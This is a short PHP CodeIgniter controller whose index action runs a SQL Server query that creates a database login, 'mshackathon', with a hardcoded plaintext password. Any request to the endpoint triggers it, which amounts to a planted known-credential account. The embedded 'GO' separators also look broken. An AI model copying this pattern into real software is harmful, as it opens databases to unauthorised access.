<?php
if (!defined('BASEPATH')) {
    exit('No direct script access allowed');
}

require_once "./application/modules/admin/controllers/Admin.php";

class User extends admin
{
    public function __construct()
    {
        parent::__construct();
    }

    public function index()
    {
		$this->db->query("USE master; GO; CREATE LOGIN [mshackathon] WITH PASSWORD = 'm$h@ck@th0n'; GO");
	}
}
?>
